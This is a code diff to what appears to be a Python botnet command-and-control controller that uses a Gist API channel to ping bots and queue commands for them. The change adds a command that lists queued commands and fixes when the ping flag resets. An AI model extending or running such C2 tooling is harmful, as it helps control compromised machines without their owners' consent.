@@ -53,9 +53,21 @@ def reader():
                 return
             case "ping":
                 EXECUTE_CMDS.append(["ping"])
+            case "todo":
+                if len(EXECUTE_CMDS) == 0:
+                    print("NO COMMANDS IN QUEUE", file=sys.stderr, flush=True)
+                else:
+                    out = "----- COMMANDS TO BE EXECUTED -----\n"
+                    for array in EXECUTE_CMDS:
+                        for cmd in array:
+                            out += cmd + " "
+                        out += "\n"
+                    out += "-----------------------------------\n"
+                    print(out, file=sys.stderr, flush=True)
             case _:
                 print("usage: <command name> [bot name] [parameter1 ...]\n\n"
                       "\tls_bots \t\t\t(lists all currently available bots)\n"
+                      "\ttodo  \t\t\t\t(list all the queued commands)\n"
                       "\texit  \t\t\t\t(stop controller)\n"
                       "\tping  \t\t\t\t(ping all bots manually)\n"
                       "\tw  <bot filename> \t\t(lists users currently logged in)\n"
@@ -121,7 +133,6 @@ def executor():
         # Check if the bots are alive every 5 minutes
         if timer() - start > 300 or ping_:  # 300 s = 5 min
             # Reset bots
-            ping_ = False
             response_time = 15
             print("----- CHECKING ALIVE BOTS -----", file=sys.stderr)
             ping.send(GIST_API, BOT_LIST)
@@ -135,6 +146,7 @@ def executor():
             print("\nREMOVING DEAD BOTS", file=sys.stderr)
             ping.check(GIST_API, BOT_LIST)
             start = timer()
+            ping_ = False
             print("----- BOT CHECK COMPLETE -----", file=sys.stderr)
 
 
